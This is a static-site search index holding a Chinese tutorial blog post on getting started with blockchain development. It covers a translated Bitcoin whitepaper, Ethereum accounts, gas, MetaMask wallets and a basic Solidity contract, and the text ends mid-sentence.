<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[区块链开发入门]]></title>
    <url>%2F2022-03-03-BlockChain.html</url>
    <content type="text"><![CDATA[失踪人员回归，学习记录点区块链知识… 区块链开发入门：从0到1构建基于以太坊智能合约的ICO DApp区块链简明发展史比特币区块链技术起源于2008年10月31日中本聪发表的比特币论文：《Bitcoin: A Peer to Peer Electronic Cash System》，即比特币白皮书，论文论述了基于P2P网络的电子现金系统的设计，系统中产生和流通的现金就是比特币(Bitcoin)。 白皮书中文 比特币：一种点对点的电子现金系统一个完全的点对点版本的电子现金将允许一方不通过金融机构直接在线支付给另一方。电子签名提供了部分解决方案，但是如果还需要一个可信任的第三方来防止双花，那么这个最大的好处也就没有意义。我们提出一个用点对点网络来解决双花的方案。这个网络给每笔交易打上时间戳，并进行哈希计算，放进一条基于哈希工作量证明的链，这形成了一个不可改变的记录，除非重做这些工作量。最长的链不仅是见证序列的证明，还证明了它来自最大的CPU算力池。因为大部分的算力由诚实的节点控制，他们将会产生一条比攻击者要长的链。网络本身需要极小化结构。消息被尽力广播，并且节点可以随意离开或重新加入网络，接受最长的工作量证明的链作为它离开这段时间发生事情的证明 1.介绍互联网上的商业几乎完全依赖信任的第三方金融机构来处理电子支付。对于大多数交易来说，这套系统工作的足够好了，但是依然受到了基于信任模型的天然缺点的困扰。完全不能撤销的交易是不可能的，因为第三方金融机构不可避免的要调解纠纷。调解的代价增加了交易的成本，限制了最小实际交易的大小，切断了临时交易的可能性，丧失了对不可撤销服务提供不可撤销支付的可能性，这又是一个广义成本。因为撤销的可能性，信任的需求不断蔓延开来。商户必须提防他们的客户，越来越多的他们本不该需要的信息困扰他们。不得不接受一定比例的骗子。这些成本和支付的不确定问题可以用面对面使用现金避免，但是还没有机制存在使得通过通信信道支付而不需要信任的第三方。 需要的是一个电子支付系统，这个系统建立在密码学证明基础上而不是信任，运行任意有这个意愿的双方直接互相转账而不需要一个可信任的第三方。交易从计算上不可撤销的，这将保护卖方权利防止被骗，并且常规的托管机制很容易实现来保护买方权益。下面提出一个防止双花的解决方案，使用点对点分布式时间戳服务器来产生按时间排序的交易的计算证明。只要城市节点控制的CPU的算力大于攻击者节点的算力，这个系统就是安全的。 2.交易我们把一种电子币定义成一条数字签名链。每一个所有者把币转给下一个人的时候，是通过将前一个交易的哈希和下一个所有者的公钥进行数字签名，并把这些追加在币的后面。收款人可以通过验证签名来确定链的所有者。 当然，问题是收款人无法验证其中一个所有者是否同一个币花了两次。一个普遍的做法是引入一个信任的中央机关，或铸币厂，他们可以检查每一笔交易来防止双花问题。每次交易后，这个币必须返回到铸币厂，这样才能发行新币，只有直接从铸币厂发行的币才被相信是没有被双花的。这个方案的问题是，整个金钱系统的命运掌握在经营铸币厂的公司，每一笔交易都要经他们，就像银行一样。 我们需要一种方法，这种方法让收款人知道上一个所有者没有签署任何以前的交易。我们的目的是让最早的交易是可信的，我们不关心后面是不是有人企图进行双花。仅有的可以确认某一个交易存在的办法是要知道所有交易。在基于铸币厂的模型中，铸币厂知道所有交易，并且可以确定哪个交易先发生。为了在无信任第三方的情况下达到共识，这个共识就是认同同一个按接收的交易顺序排列的历史记录。收款人需要证据来说明在每一笔交易的时候，大多数节点一致认为这个交易是第一时间到达的。 3.时间戳服务器我们提出的解决方案是从一个时间戳服务开始，这个服务器工作的方式是，对条目所在的区块的哈希加盖时间戳，并且广泛地公开这些哈希，比如通过报纸或者新闻组邮件。显然，为了能进入这个哈希序列，时间戳证明的数据在那个时间必须存在。每一个时间戳和以前的时间戳，形成了一条链，每一个追加的时间戳都是对前一个时间戳进行加强。 4.工作量证明为了基于点对点的基础实现一个分布式的时间戳服务器，我们将需要一个工作量证明的系统，这个系统和亚当贝克创造的“哈希现金”类似，而不是报纸或新闻组邮件。这个工作量包含寻找一个哈希值，比如用哈希算法SHA-256,这个哈希值以若干0开头。平均工作量和开头的0的个数是指数关系，并且验证很简单，只需要执行一次单独的哈希计算。 在我们的时间戳网络里，是这样实现工作量证明的，就是不断增加区块里的一个临时的数值，直到找到一个值使得区块的哈希值满足开头0的个数要求。一旦CPU花费计算满足了工作量证明的要求，这个区块链就无法修改，除非重新计算。随着后面的区块不断产生，想要改变这个区块，需要重做它后面所有区块的工作量。 工作量证明还解决了在多数决策法中决定展示的问题。如果大多数是基于一个IP一票，这可能会被可以支配多个IP的人破坏。工作量证明本质上也是一个IP一票。最长的链代表了大多数人的决定，这个链投入了最大的工作量。如果大多数的CPU算力由诚实节点控制，诚实的链就会增长的很快，超过任何竞争链。为了修改过去的一个块，攻击者需要重新投入算力完成这个却快和它以后的区块的工作量，然后追上并超越诚实节点的工作量。我们后面讨论落后的攻击者追上的概率，这个概率随着后面区块的增加呈现指数级减少。 硬件的速度越来越快，参与运行的节点随着时间兴趣也随着经常变化，为了抵消这些因素的影响，工作量的难度是由每小时区块产生的数量的浮点型来决定的，如果区块产生的太快，难度就相应的增加。 5.网络运行这个网络的步骤如下： 新交易给所有节点广播 每个节点将新交易放到一个区块 每个节点开始为这个区块寻找相应难度的工作量证明 当一个节点找到了这个工作量证明，把这个区块广播给所有节点 如果区块里所有的交易是有效的并且是没有被花费的，节点就会接受这个区块 节点把这个区块的哈希作为上一个哈希，并开始进行工作以竞争创建下一个区块 节点总是认为最长的链是正确的，并且不断的工作去延长它。如果两个节点同时广播下一个区块，一些节点可能接受其中一个，也可能是另一个。这种情况下，他们在最先接收到的区块上工作，但是也会保存另外一个分支以防止它会变得更长。当下一个工作量被找到并且一个分支变得更长时，这种情况就会被打破，在另外一个分支上工作的节点就会切换到这个长的链上。 新交易广播不一定要广播到所有节点。只要他们能到达很多节点，这个交易很快就会进入下一个块。区块广播也能接受消息丢失。如果一个节点没有收到区块，当它收到下一个块时会发现自己少了一个区块，它就会请求来获得少的这个区块。 6.激励按照惯例，区块的第一个交易是一个特别的交易，这个交易会发行新币并且所有者是这个区块的创建者。这为节点支持网络引入了激励机制，并且这提供了一个初始发行货币进入流通的方式，因为没有一个中央机构去发行他们。不断增加新货币的过程类似于黄金矿工消耗资源来增加黄金的流通。在这里，消耗的是CPU的时间和电费。 激励还包括提供交易手续费。如果交易中输出值比输入值小，这个差值就是手续费，它被加入到这个区块激励值里。一旦预定数量的币全部进入流通，激励就全部转为交易手续费，完全没有通货膨胀。 激励有助于鼓励节点保持诚实，如果一个贪婪的攻击者掌握比所有诚实节点还要大的算力，他将面临一个选择，是通过偷回他支付的钱来诈骗人，还是用算力产生新的币。他应该会发现遵守规则有更多的好处，这个规则可以让他比其他人组合得到更多的新币，比破坏这个系统得到的更多，而且财产合法。 7.回收磁盘空间一旦一个币最新的交易被足够多的区块埋没，它之前的花费的交易就可以丢掉来节省空间。为了促成这个而不破坏区块的哈希，用这些交易生成一个默克尔树，仅仅根保存在区块的哈希里。那么旧区块可以通过去除树的一些分支进行压缩。这些内部的哈希就不用保存了。 一个区块头大概80字节，如果我们假设每十分钟产生一个区块，一年就是80字节x6x24x365=4.2兆字节。2008年出售的电脑典型的配置是2G内存，根据摩尔定律预测，每年增加1.2G，即使区块头全部放在内存里，存储也不是问题。 8.简化支付验证即使不允许网络节点，验证支付也是可能的。用户仅需要保存最长工作量证明链的区块头的拷贝，他通过查询网络节点直到确信它有最长的链来获取区块头，并且可以得到默尔克分支，分支连接了交易和这个打了时间戳的区块。他本身不能验证交易，但是通过连接到链上的一个地方，他可以看到网络节点已经接受了它，后面的区块进一步确定网络接受了它。 因此，如果诚实节点控制着网络，验证就是可靠的，如果网络被攻击者控制，验证就是很弱的。虽然网络节点本身可以验证交易，但这种简化验证的方法会被攻击者编造的交易欺骗，因为攻击者可能持续控制网络。防止这种情况的一种策略是接收网络节点的告警，当他们检测到无效块的时候，提示用户软件下载整个区块，并且提醒确认交易的一致性。频繁接收支付的企业可能仍然想运行他们自己的节点，为了更独立的安全性和更快的验证。 9.组合和分割价值虽然可以单独处理硬币，为转账的每一分单独交易是很不方便的。为了能是价值分割和组合，交易包含多个输入和输出。正常的会有一个单独的以前交易来的大额输入或多个小额输入组合在一起，最多两个输出：一个用来支付，一个用来找零，有零钱的话会返回给发送者。 应该注意的是，一个交易依赖几个交易，这些交易依赖更多的交易，看起来很分散，但在这里不是一个问题，从不需要提取一个交易全部历史的独立的拷贝 10.隐私传统的银行通过限制向有关方和信任的第三方提供信息来达到一个保护隐私的目的。向公众广播所有交易的必须性将这个方法排除了。通过打破信息在其他地方流动性仍然可以保护隐私：通过保持公钥匿名性。公众可以看到一个人给其他人转钱了，但是没有信息可以把交易和某人联系起来。这类似于证券交易所公布的信息水平，交易时间和个人交易的规模是可以公开的，但不告诉当事人是谁。 作为一个附加的防火墙，每次交易都是使用一个新的密钥对，防止和一个共同的所有者联系起来。对于多输入交易来说，这个联系无法避免，所有的输入必须表明由同一个人所有。风险是如果表明了某一个秘钥的所有者，这种联系将表明其他交易也属于同一个人。 11.计算我们想象一个场景，攻击者想要攻击用比诚实节点更快的速度产生一个替代链，即使成功了，也不会让系统能任意被修改，比如凭空产生价值或拿到不属于攻击者的钱。节点将不会接受一个无效的支付，并且诚实节点绝不会接受包含这种支付的区块。攻击者只能试着改变自己的交易来拿回本该花出去的钱。 诚实的链和攻击链的竞争可以说是二项式随机走动。成功事件是诚实链延长一个区块，领先优势加一，失败事件是攻击链延长一个区块，缩小一个差距。 一个攻击者从一个给定的赤字中追上的概率类似于赌徒破产问题。假设一个信用无限的赌徒从赤字开始，开始进行潜在次数无数的赌博，试图达到盈亏平衡。我们可以计算他达到盈亏平衡的概率，或者说从下次攻击链赶上诚实链的概率，如下：p=诚实节点发现下一个区块的概率 q=攻击者找到下一个区块的概率 qz=攻击者在落后z个区块的情况下，追上的概率 假设p&gt;q,随着落后区块数量z增加，攻击者追上的概率呈指数下降。这个概率情况对攻击者不利，如果他没有幸运的提前向前冲刺，落后越多希望越渺茫。 我们现在考虑接收者在收到新的交易的时候，需要等待多长时间才能完全确定交易不能被发送者修改。我们假设发送者是攻击者，他想让接收者暂时相信他已经付款了，然后过了一段时间又换成是支付给自己。这事发生的时候接收者会受到警告，但是发送者希望一起都晚了。 接收者创建一个新的密钥对，签名之前很短的时间把公钥给发送者。这防止发送者提前准备一条链，持续在上面工作，直到他足够幸运达到了领先的程度，正好执行到这条交易。一旦这个交易发送了，不诚实的发送者开始在一个并行的链上秘密工作，这条链包含他的交易的另一个版本。 接收者一直等到知道交易被添加到一个区块中，并且后面已经追加了z个区块了。他并不知道攻击者的准确进展，但是可以假设诚实区块每个区块花费的时间是平均期望时间，攻击者潜在的进展将服从泊松分布，期望值： 为了得到目前的攻击者仍能追上的概率，我们将他所取得的每一步进展的泊松密度乘以他可能从那一点追上的概率。 变换一下避免对分布的无穷尾部求和… 转换为c代码 12345678910111213141516#include &lt;math.h&gt;double AttackerSuccessProbability(double q, int z)&#123; double p = 1.0 - q; double lambda = z * (q / p); double sum = 1.0; int i, k; for (k = 0; k &lt;= z; k++) &#123; double poisson = exp(-lambda); for (i = 1; i &lt;= k; i++) poisson *= lambda / i; sum -= poisson * (1 - pow(q / p, z - k)); &#125; return sum;&#125; 运行结果， 可以看到概率随着z的增加呈指数下降 12345678910111213141516171819202122232425262728293031323334q=0.1z=0 P=1.0000000z=1 P=0.2045873z=2 P=0.0509779z=3 P=0.0131722z=4 P=0.0034552z=5 P=0.0009137z=6 P=0.0002428z=7 P=0.0000647z=8 P=0.0000173z=9 P=0.0000046z=10 P=0.0000012q=0.3z=0 P=1.0000000z=5 P=0.1773523z=10 P=0.0416605z=15 P=0.0101008z=20 P=0.0024804z=25 P=0.0006132z=30 P=0.0001522z=35 P=0.0000379z=40 P=0.0000095z=45 P=0.0000024z=50 P=0.0000006对于p&lt;0.1%的求解…p &lt; 0.001q=0.10 z=5q=0.15 z=8q=0.20 z=11q=0.25 z=15q=0.30 z=24q=0.35 z=41q=0.40 z=89q=0.45 z=340 12.结论我们为无信任电子交易提出了一个系统，我们从数字签名币的常用框架开始，它对所有者有很强的控制，但是因为不能避免双花，所以还不完整。为了解决双花，我们提出了一个点对点网络，这个网络使用工作量证明记录一个公共的交易历史，只要诚实节点控制大部分的CPU算力，很快使得攻击者无法通过计算来改变交易历史。该网络的非结构化简单性使得它很稳健。节点同时工作，很少需要相互协调。他们不需要被识别，因为消息不需要路由到任何特定的位置，只需尽力传递就好。节点可以离开网络，也可以需要的时候重新加入网络，接受工作量链作为他离开的时候发生了什么的证据。他们用CPU算力投票，通过在有效的区块上工作并延续它来表达对区块的接受，通过不在新区块上工作表示拒绝无效区块。任何需要的规则和激励都可以在这种共识机制下进行。 基于论文的比特币网络于2009年初正式上线，其主要目的是存储该电子现金系统里所有账户间的转账交易，并且确保这些交易记录无法被篡改。 以太坊比特币网络的功能仅限于让用户进行财务交易Finanicial Transaction，之后没有多久，很多就意识到可以用比特币创意中的区块链技术来进行金钱之外的价值交换，Vatalik Buterin 于 2013 年末发布了以太坊的白皮书：《Ethereum: The Ultimate Smart Contract and Decentralized Application Platform》 相比比特币网络的简洁，V提出了基于区块链技术创建更加复杂的去中心化应用Decentralized Application，简称为DApp的技术设计，典型的去中心化例子： 基于以太坊创建新的加密货币 CroptoCurrency,这种能力是2017年各种ICO泛滥的技术动因。 基于以太坊创建域名注册系统、博彩系统 基于以太坊开发去中心化游戏，2017的以太猫等 这些功能的实现都依赖于以太坊内建的智能合约Smart Contract，智能合约是存储在以太坊网络上的可以通过发送消息与之交互的代码片段。 基于以太坊智能合约可以方便的发行遵循ERC20规范的数字货币，这个过程常常被称为首次代币发行Initial Coin Offering，简称ICO,这给区块链企业融资提供了极大的便利，但由于成本极低被很多人滥用了，因为ICO过程是不受监管、且完全中心化的，项目方拿到募集来的以太坊随便花，而投资者拿到代币之后对项目运作和资金开销没有任何约束力。 2017年底V提出了 DAICO 的理念，即筹集的资金会被智能合约锁定在账户里面，区块链创业团队在资金支出时先提出请求，多数投资者投票同意后，募集来的资金才可以被花出去，这在很大程度上保障了投资者的利益，也是在鼓励创业团队踏实做事。实战小册灵感源于此，不算是严格意义上的ICO App，因此不涉及发币过程，但现有众筹版本。 区块链 vs WEB如果回顾区块链的发展历史，业内通常把区块链技术的发展分成3个阶段，作为前端工程师，我们可以将其和WEB技术的发展历史做如下类比： 区块链1.0，代表是比特币，只支持转账，类似于刚刚诞生的万维网，网页只支持静态内容的展示、链接等； 区块链2.0，代表是以太坊，能够在转账的基础上支持一定复杂度的业务逻辑定制即智能合约，类似于有了JS的万维网，即在静态展示的基础上自定义动态内容，但是浏览器的JS执行效率还是比较弱，不能在浏览器做非常复杂的事情； 区块链3.0，代表是各种高性能底层公链，比如EOS,是目前整个社区努力的方向，但开发生态的成熟还需要时间，能够支持高并发商业应用的运行，类似于为能各种复杂的端应用提供运行环境的现代浏览器，比如Chrome; 区块链中的核心概念和原理账户、交易、区块、区块链如果说比特币是最早最成功的区块链应用，即基于区块链技术实现的银行系统，负责记账和发行货币，那么银行系统中存在的概念在区块链系统中也会存在，可以用银行账本中的概念来类比理解区块链的概念： 账户Account：是用户在银行的户头+密码的组合，在区块链世界中也是如此，无论是比特币还是以太坊的账户都是由地址、公钥、私钥3部分构成，其中地址相当于用户名，而公钥+私钥相当于密码，尤其是私钥，丢失或者泄露就意味着是去账户（敏感信息、资金）的控制权 交易Transaction：是账本中的任意一条收支记录，在区块链世界中可以指两个账户之间的转账交易、或者智能合约调用请求； 区块Block：是账本中的一页，账本的每页可能包含多笔收入和支出，同样，区块链中的每个区块都可能包含多笔交易 区块链Blockchain：是装订成册的多页账本，账本不同页按照记录时间先后顺序组织，区块链中不同区块按被矿工打包的时间先后组织 区块链技术通常被简单描述为：公开的、分布式、不可篡改的数据库技术或记账技术 块高度、出块时间长时间记录的账本都会是多页的，在区块链世界也是如此，长时间运行的区块链网络记录下来的数据量也是巨大的。 块高度可以理解为账本的页数，在区块链世界里，块高度可以理解为自该区块链开始运行到现在共产生了多少区块，换个角度，我们可以认为块高度就是区块链时间的时间，每产生一个新的区块，快高度就会加1，比特币最新块高度，以太坊最新快高度 出块时间可以类比为记完每页账户并在上面按完手印需要花多少时间，在区块链世界里，即区块链上相邻两个块产生出来的时间间隔，或者常说的交易确认时间Transaction Confirm time，这里说的交易确认时间指某笔交易从发起到被打包进区块链的时间，和部分钱包、交易所的交易确认时间小很多，比如比特币的区块时间通常控制在10分钟，而以太坊则是15秒左右。任何打包的交易在分布式网络上达成共识都需要时间，共识算法决定了时间的长短。POW、POS、DPOS 本章图解 以太坊核心概念和原理以太坊网络分两个视角来看： 整体视角以太坊网络本质是P2P网络系统，其用途是发起交易、存储交易历史，这里的交易可以是转账或者是调用智能合约中的方法，而以太坊区块链是存储了以太坊网络上发生过的每笔交易的数据库。以太坊网络通常情况下是指主网，实际上社区中存在很多用途各异的以太坊网络，类比到Web工程里面3套环境，可以将其归类如下： 主网：Mainnet,就是以太坊的线上环境，记录、保存用户和智能合约的交易，主网中存储的代币才具有真正的价值； 测试网：Testnet，就是以太坊的测试环境，目的是方便社区和开发者测试智能合约、转账等功能，典型的测试网络有Rinkeby/Ropsten/Kovan等，其中代币不具有任何价值，完整列表 其他网：就是以太坊的开发环境，常通过开发者在本地运行以太坊节点组成，或者使用各种便捷的工具启动的本地测试网，以及以内部测试为目的而搭建的私有网络等，随着以太坊区块链数据的累计，运行全节点的时间和硬件的成本也越来越大，实战会用更加轻量的开发环境搭建方式 个体视角P2P网络通常包含多个节点，每个节点都需要运行以太坊客户端，而任何人都可以运行以太坊节点，每个以太坊网络上的节点都包含了以太坊区块链数据库的整体副本，每个以太坊网络节点都可以接收RPC交易请求并将请求广播给网络中的其他节点，每个以太坊节点都会尝试进行交易的校验、打包（常说的挖坑），即区块生产的任务，生产出的区块也会被广播给其他网络节点。 以太坊不同网络之间的账户可以完全相同，就好比我们可以把线上数据库的数据全部同步到我们测试环境数据库一样，但是不同测试网络之间、测试网络和主网之间、本地开发网络和主网之间是完全隔离的，即无法进行转账和智能合约功能调用 如何进行以太坊网络交互交互的具体定义是：向以太坊网络发送转账请求，或调用智能合约函数，用我们熟悉的计算术语来说，就是发起读取或者修改以太坊区块链上数据的请求，并拿到反馈的过程。 类似于现有世界中支持开发者自行开发应用的平台，比如微博开发平台、微信小程序等，我们可以把与平台交互的用户分成两大类：开发者、普通用户，两者与平台本身的交互方式、交互途径不同。 比如微信小程序生态下，开发者。普通用户、平台之间的交互方式可以简化如下： 类似的，以太坊生态中，开发者、普通用户、平台的交互方式可简化为： 其中，web3.js是前端工程师通过代码和以太坊网络交互的桥梁，而实际的DApp测试离不开使用钱包。 不论是开发者，还是普通用户，与以太坊网络的交互都会落地到具体的网络节点上，因为只有节点可以接收RPC请求并将其广播给其他节点，任何代码或者应用如果需要同以太坊网络交互，都需要通过某个具体的节点。 智能合约智能合约指以太坊网络上被代码控制的一个账户，不同于我们使用各种钱包软件创建的账户（由创建账户的用户来控制），智能合约对应的账户是由代码控制的，其他账户（包括智能合约账户、普通用户账户）可以通过交易Transcation的方式与智能合约账户交互，社区中也会把智能合约账户称为内部账户，而普通用户称为外部账户。这两种账户的关系可以用下图描述： 此外还需要注意的是，我们也常常用智能合约指代智能合约源代码或部署在以太坊网络上的智能合约账户，但本质上两者是有明显的区别的：如果把智能合约源代码比如设计图，那么智能合约账户就是根据蓝图造出来的车或者建筑。相同的源代码可以部署到不同的网络上，或者在相同的网络上部署很多次，都会产生不同的合约地址。整个过程可以用下图示意： 无论部署到哪个网络，源代码是完全相同的，而部署所产生的智能合约账户只存在于其被部署到的那个网络，比如部署到Mainnet主网的智能合约不能通过Rinkeby测试网络去访问，反过来亦然，普通账户则在不同网络间是通用的。 每个智能合约会有下面几个关键属性： balance,即该智能合约账户所控制的资产余额，比如某个抽奖智能合约中奖池的资金； storage,智能合约的相关数据会存储在这里，可粗暴的将其看做是DApp的数据库，比如抽奖智能合约里面存储参与人的地址； code,智能合约的字节码，由智能合约源代码编译儿而来的，存储在区块链上方方便任何节点接受智能合约的函数调用 使用Metamask创建第一个以太坊HD钱包接触任何区块链网络都需要我们有自己的账户，管理账户的软件可称之为钱包，在创建钱包和账户之前，我们有必要了解以太坊网络中账户的组成： 如上图，以太坊网络中的账户和典型的区块链账户没有太大区别，都由地址、公钥、私钥3部分构成，不论使用何种钱包构建的以太坊账户，在不同的以太网网络之间都是可以通用的，比如我在主网构建了钱包账户，而切换到Rinkeby测试网络时依然可以使用同样的账户，这和传统的Web应用有很大的区别，比如我们在微信创建的账户就不能到百度上。这种跨网络的账户机制实际上是内置在以太坊客户端之内的，无需关心细节。 不论是在以太坊网络上发起转账交易，还是部署智能合约，亦或是调用智能合约中的函数，我们都需要账户，方便以太坊记录和验证谁、在什么时间、做了什么。 区块链世界里面的钱包其实借鉴自现实世界的钱包，区块链世界里面，每张银行卡对应一个账户，每家银行对应一个区块链网络，而能管理你所有银行卡的软件叫做钱包，对应关系如下: 钱包运行环境Metamask是浏览器插件，虽然能运行在多个浏览器，但考虑到Solidity调试工具运行环境、前端调试工具的丰富程度建议在Google浏览器进行 创建钱包和账户Metamask 为我们提供了非常便捷的以太坊浏览器钱包插件，Google Chrome WebStore 的下载地址猛击这里 助记词是用来生成账户的公钥和私钥的，也就是用来恢复钱包里面所有的账户的。如果创建的是存在真实资产的账户，不要泄露助记词。 从密码学角度，地址、公钥、私钥本质都是非常大的数字，不论是转换为16进制或者base58格式，对普通用户来说看起来都是杂乱无章的随机字符串，如果区块链用户非要记住这些数字才能使用区块链的话，会非常麻烦。于是比特币社区提出了BIP39提议，技术上该提议可以在任意区块链中实现，比如使用完全相同的助记词在比特币和区块链上生成的地址可以是不同的，用户只需要记住满足一定规则的词组，钱包软件就可以基于该词组创建一些列的账户，并且保障无论是在什么硬件、什么时间创建出来的账户、公钥、私钥都完全相同，这样解决了账户识住的问题，也吧账户恢复的门槛降低了很多。支持BIP提议的钱包也可以归并为HD钱包，Hierarchical Deterministic Wallet,Metamask当属此类。 深入理解以太坊中的交易Transaction从测试网络的充值不会马上成功，而是有15秒左右的延迟，正确理解区块链网络的交易Transaction是做区块链开发必要条件，正确理解以太坊网络上的交易是设计、开发出合理智能合约+DApp的基础条件。 交易详情中的几组关键信息： Transaction Hash：交易流水号，就像是去银行转账给你业务回折的那个流水号 Block：说明这笔交易被打包进了编号（快高）为xxx的区块， xxx Block Confirmations 表示这笔交易被打包以后，以太坊的Rinkey 测试网有产生了149个区块 Form/To/Value：交易的发起账户、接收账户、以及转账金额，如果是智能合约调用也会有这三个字段，但是会有说明调用了智能合约什么函数 Gas Price：交易手续费，Gas是交易手续单位，Ether,Gwei是以太坊中代币的单位， Limit表示在交易执行时最多消耗的汽油数量 Used 表示实际使用了多少汽油 以太坊交易中的汽油和现实中的汽油有异曲同工之妙，如果把以太坊交易比作开车去长途旅行，不难得出结论： 长途旅游必然消耗汽油，而旅行消耗汽油的单位为升，在以太坊里面汽油的单位就叫做Gas 加油询问油价，以太坊中汽油的价格是用自己的货币比好标识的，可以为0.0000000039 Ether/Gas，也可以说 3.9 Gwei/Gas，其中的 Ether 和 Gwei 是以太坊中的货币单位 现实中货币单位精度为2为小数，即精确到分，区块链世界中的货币单位精度可以多达18小数 现实世界中如果中途没有油了，可以停在原地请求支援，以太坊中Gas不够，交易就会被直接回滚 如果现实里面的汽车行驶不需要消耗任何能源，即不支付任何经济成本，就很容易堵车。如果把以太坊比作高速公路，而各种交易比作行驶的汽车，设计汽油机制以及可以调控的汽油价格就是很好的网络拥塞避免措施，如果想降低汽油车出行，发改委可以把油价提的很高 这里说的Ether就是在各种数字货币交易市场上的以太坊的交易单位，即ETH,以太坊的货币单位精度很高，所以不同精度货币单位的列表也很长，不同单位之间的换算可以参考：etherconverter.online Gas LImit 和 Gas Price 详解Gas机制为什么以太坊选择使用Gas去调节手续费，而没有选择像比特币那样使用比特币本身作为交易手续费 Gas是以太坊虚拟机EVM内部流通的货币，以太坊虚拟机用Gas来对交易打包、智能合约执行等操作收取费用。 调用某智能合约的接口需要执行如下操作，合约源代码编译出来的opcode就对应EVM中的操作，每个操作会产生特定的费用： 执行加法运算：1Gas 存储某个变量的值：100Gas 调用其他智能合约：20Gas 上会举例，完整的操作、手续费表在这里 在这种机制下，以太坊就可以对更加复杂的智能合约收取更多的费用，这样做很公平合理，因为需要更多存储和计算的智能合约消耗的资源更多，跟比特币不同的地方在于，比特币本身不支持在交易中包含复杂的计算逻辑，比特币是不支持智能合约的。 向以太坊提交一笔交易时，我们需要在交易中设定下面两个参数，虽然大多数时候只需要设定Gas Limit： Gas Price：指定我们愿意为每单位Gas支付的最高价格，Gas Price的单位才是以太坊中的单位，比如Wei,GWei Gas Limit：指定我们最多愿意为执行该笔交易支付多少个 Gas 家政服务公司的类比假设有家家政服务公司，主营业务是个客户提供清洁服务，运行让雇员在开展业务的收入随着市场供需的变化而变化，为了实现这种灵活性，家政服务公司发行了一种代币叫做清洁币QJB,客户在支付清洁费用时不实际支付人民币，而是支付代币，而清洁不同类型的房间收取不同的QJB，数量由家政服务公司设定，并且不允许修改： 主卧，1QJB 客户，3 厨房，15 卫生间，10 客户只需要支付家政公司QJB，而雇员收入的是QJB,QJB可以随时换成发币 这种机制下，家政公司的雇员实际上就客户愿意为每个QJB支付多少钱进行谈判，选择对自己有利的需求去满足，比如雇员希望每个QJB能换算为100人民币，而客户却只愿意支付80元，这时雇员就可以选择放弃为该客户服务，而且服务愿意支付更高价格的客户，自由度和灵活性就这样产生了。 以太坊中的Gas Price有异曲同工之妙，雇员扮演矿工的角色，客户的清洁需求好比提交到网络中的转账交易，如果交易的Gas Price设置过低，矿工可以选择不理会这笔交易，只打包Gas Price满足自己设定的最低值交易。实际上以太坊网络上的矿工也是这么做的，他们在启动节点时会设置能接受的最小Gas Price，低于设定值的交易都会被过滤掉，不同的矿工对于把这个值设为多少是有自由的。 Gas Limit在家政服务中是这样的： 假如你租了个别墅，里面房间特别多，生日那天开了一个Party，结束后需要有人来清理，但是因为办完派对，能支付清洁费用的资金有限，这时会跟说家政公司雇员说，我最多愿意为整个清洁支付50QJB,每个QJB价值是100元，如果费用不够打扫整个别墅，扫到哪里是哪里吧，剩下的我自己搞定。家政公司雇员开始工作后会多退少就停止。 这就好比执行复杂智能合约时，填写了如下的参数： Gas Price：100GWei/Gas Gas Limit：50Gas EVM在执行你的交易时如果实际消耗的费用在50个单位以内，交易就会成功被执行和打包，如果不够，消耗到50个单位汽油时就会停止并回滚交易，这点和家政服务不同，清洁工作停止的时候，已经打扫过的房间会保持干净的状态，但是在EVM里面，不存在执行一半的交易，要么成功，要么回滚，即使Gas不够，不成功的执行也是消耗了计算资源。 Gas是EVM对各种操作收取费用的机制，如果你需要发起交易，Gas Price是你实际报给矿工的Gas单价，而Gas Limit表示你最多愿意为这笔交易支出多少个单位的Gas。 EVM执行每笔交易时实际要消耗多个Gas计算过程相关文章在此 几个重要的细节纯转账交易的手续费以太坊纯转账交易的Gas消耗是21000个单位，这里的纯转账指转的是ETH,不包括各种ERC20的代币，因为代币本身是智能合约，转账的时候需要调用智能合约的接口。 Block Gas Limit如果把Gas Limit设置过高，会直接抛出错误：Exceeds block gas limit，这是以太坊从经济角度的独特设计，如果大家的 Gas Limit都可以设置得无限大，那么最后需要回退的 Gas 就很多了。 合理的Gas Priceetherscan.io 上有个实时变动的数据说明交易中合理的 Gas Price 应该设置为多少，猛击链接 [https://etherscan.io/gastracker) 查看，如果想查看历史变化趋势，有下面两个链接供参考： Gas Limit 均值变化趋势可参考：[https://etherscan.io/chart/gaslimit)。 Gas Price 均值变化趋势可参考：[https://etherscan.io/chart/gasprice)。 智能合约编程语言 Solidity介绍以及开发入门什么是Solidity?Solidity官方文档如是说： Solidity 是一种面向对象的高级语言，用于实现智能合约。智能合约是管理以太坊状态内账户行为的程序。 Solidity 是一种花括号语言。它受 C++、Python 和 JavaScript 的影响，旨在针对以太坊虚拟机 (EVM)。您可以在语言影响部分找到有关 Solidity 受到哪些语言启发的更多详细信息。 Solidity 是静态类型的，支持继承、库和复杂的用户定义类型等特性。 使用 Solidity，您可以创建用于投票、众筹、盲拍和多重签名钱包等用途的合约。 Solidity属于强类型语言，内涵的类型除了常见的编程语言中的标准类型，还包括address等以太坊独有的类型，Solidity源码文件通常以.sol作为扩展名， Solidity源代码要成为可以运行在以太坊的智能合约需要经历如下的步骤： 用Solidity编写的智能合约源代码徐还要先使用编译器编译为字节码Bytecode,编译过程中会同时产生智能合约的二进制接口规范 Application Binary Interface,简称为ABI 通过简易Transaction的方式将字节码部署到以太坊网络，每次成功部署都会产生一个新的智能合约账户； 而使用JavaScript编写的DApp通常通过web3.js+ABI去调用智能合约中的函数来实现数据的读取和修改，整个过程可以用下图示意： Bytecode和ABI可以认为是智能合约源代码的两种外在表现形式，其中Bytecode是给机器执行的，而ABI是给DApp开发者用的自然语言描述的合约接口规范。 从整体上来看，开发智能合约+DApp 不需要我们精通Solidity,但需要理解他和我们所熟知的语言的最大区别，就可以顺利开发出正确的智能合约。 怎么开发Solidity?Remix是以太坊社区开发出来的在线智能合约集成开发环境，包含开发、部署、调试支持，官方还提供了桌面版，但桌面版仍然需要网络才可以正确运行 在前端开发环境中构建自己的智能合约的工作流，则需要组合使用现有的工具实现智能合约的编写、编译、部署、测试等环节。 使用Solidity开发实现智能合约Hello World使用Remix开发和调试第一个智能合约，浏览器打开https://remix.ethereum.org 1234567891011121314151617pragma solidity ^0.4.17;contract Car &#123; string public brand; constructor(string initialBrand) public &#123; brand = initialBrand; &#125; function setBrand(string newBrand) public &#123; brand = newBrand; &#125; function getBrand() public view returns (string)&#123; return brand; &#125;&#125; Solidity遇到public变量时，会认为其实需要持久化存储在以太坊区块链上的合约数据，即不仅仅是public 